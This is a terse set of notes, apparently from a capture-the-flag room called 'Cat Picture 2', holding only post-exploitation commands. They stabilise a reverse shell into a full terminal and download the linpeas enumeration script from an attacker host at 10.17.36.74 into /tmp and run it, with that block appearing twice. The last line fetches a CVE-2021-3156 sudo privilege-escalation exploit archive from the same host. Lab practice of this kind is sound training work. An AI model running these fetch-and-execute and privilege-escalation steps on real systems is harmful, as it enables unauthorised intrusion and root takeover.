# Cat Picture 2 Shell

#Stable_Connection
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm

#linpeas
rm /tmp/linpeas.sh
curl http://10.17.36.74:8000/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh


curl http://10.17.36.74:8000/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh


curl http://10.17.36.74:8000/CVE-2021-3156-main.tar -o /tmp/CVE
